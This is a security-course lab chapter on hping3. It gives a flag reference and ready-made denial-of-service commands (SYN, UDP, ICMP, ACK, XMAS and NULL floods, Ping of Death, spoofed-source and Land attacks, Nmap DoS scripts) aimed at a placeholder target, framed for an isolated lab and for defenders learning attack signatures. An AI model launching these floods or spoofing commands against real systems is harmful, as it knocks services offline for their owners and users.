# Chapter 3 — Attack Simulation Lab: hping3

> ⚠️ **Run only inside an isolated lab network (host-only/NAT, no route to the internet) against VMs you own.** Every command below targets a placeholder `target_ip` — never a real host you do not have written authorization to test.

## 3.1 Lab Topology

```
[Kali Linux - Attacker]  <--- Host-only/NAT vSwitch (no internet) --->  [Metasploitable2 / Windows 10 - Target]
```

- Hypervisor: VMware Workstation or VirtualBox
- Network adapters set to **Host-only** or an isolated **NAT** segment
- Snapshot both VMs before testing so you can roll back cleanly

## 3.2 What Is hping3?

`hping3` is a command-line network tool able to send custom TCP/IP packets and display target replies, similar to `ping` but far more flexible. It can handle fragmentation, arbitrary packet body/size, and can even transfer files over supported protocols. Legitimate defensive/testing use cases include:

- Testing firewall rules
- Advanced port scanning
- Testing network performance under different protocols, packet sizes, and fragmentation
- Path MTU discovery
- Traceroute-like functionality under different protocols
- Remote OS fingerprinting
- TCP/IP stack auditing

## 3.3 Core Flags Reference

| Flag | Meaning |
|---|---|
| `-S` | Send SYN packets |
| `-A` | Send ACK packets |
| `-F` | Send FIN packets (also reused below for a XMAS-style variant) |
| `-Y` | Send packets with no flags set (NULL) |
| `-1` | ICMP mode |
| `-2` | UDP mode |
| `-p <port>` | Destination port |
| `--flood` | Send packets as fast as possible (no reply-wait) |
| `-i u1` | Set the interval between packets (here, 1 microsecond) |
| `-d <bytes>` | Packet size in bytes |
| `-c <count>` | Number of packets to send |
| `-a <ip>` | Spoof the source ("any") IP address |
| `-C <bytes>` | Set ICMP packet size (Ping-of-Death style) |

## 3.4 Simulated Attack Commands (Lab Use Only)

**SYN Flood**
```bash
hping3 -S -p 80 --flood -i u1 -d 120 -c 1000 target_ip
```
Sends a flood of SYN packets to port 80. `-S` marks them as SYN, `--flood` sends as fast as possible, `-d 120` sets the packet size to 120 bytes, `-c 1000` caps it at 1000 packets.

**UDP Flood**
```bash
hping3 -2 -p 53 --flood -d 120 -c 1000 target_ip
```
Floods UDP packets at port 53 (DNS), forcing the target to process and often respond with ICMP unreachable errors.

**ICMP Flood**
```bash
hping3 -1 --flood -c 1000 target_ip
```
Floods ICMP Echo Requests.

**TCP ACK Flood**
```bash
hping3 -A -p 80 --flood -d 120 -c 1000 target_ip
```
Sends spoofed/unsolicited ACK packets, which many stateful devices must process against their connection tables.

**XMAS Flood**
```bash
hping3 -F -p 80 --flood -d 120 -c 1000 target_ip
```
(Note: a genuine XMAS scan sets FIN+PSH+URG together; some course material shorthand uses `-F` alone for illustration — in practice combine flags, e.g. `--flags FIN,PSH,URG`.)

**NULL Flood**
```bash
hping3 -Y -p 80 --flood -d 120 -c 1000 target_ip
```
Sends packets with no TCP flags set — often used to probe or evade simplistic flag-based filtering.

**Ping of Death (large ICMP payload)**
```bash
hping3 -C 1000 -c 1000 target_ip
```
Sends oversized ICMP packets designed to stress fragmentation/reassembly handling on older/unpatched stacks.

**Teardrop-style (malformed/spoofed source)**
```bash
hping3 -a 192.168.1.1 -c 1000 target_ip
```
Spoofs the source address; classic Teardrop relies on overlapping fragment offsets, which modern stacks largely patch against.

**Land Attack (source = destination)**
```bash
hping3 -S -p 80 -a target_ip target_ip
```
Spoofs the source IP as identical to the destination IP — historically caused some systems to loop packets to themselves.

## 3.5 Nmap DoS-Adjacent Scripts

Nmap's NSE (`--script`) library includes scripts that *test* for DoS susceptibility — useful for authorized vulnerability assessment, not for launching attacks at scale:

```bash
# General DoS category script
nmap --script dos target-ip

# Specific tests
nmap --script http-slowloris target-ip
nmap --script smb-flood target-ip
nmap --script ssl-dh-params target-ip

# Aggressive timing for DoS-category testing
nmap -T5 --script dos target-ip
```

## 3.6 Why This Matters for Defenders

Every command above produces a **distinct, recognizable packet signature** — that's the entire point of practicing them in a lab. Once you've generated a SYN flood and watched your firewall's connection table fill up, or generated a Slowloris pattern and watched Apache's worker threads stall, you'll recognize those same signatures instantly in production logs and packet captures. That recognition is the actual skill this chapter builds — not the ability to run the tool.

Continue to [Chapter 4 — Attack Simulation Lab: Frameworks & Scripts](04-lab-frameworks-scripts.md).
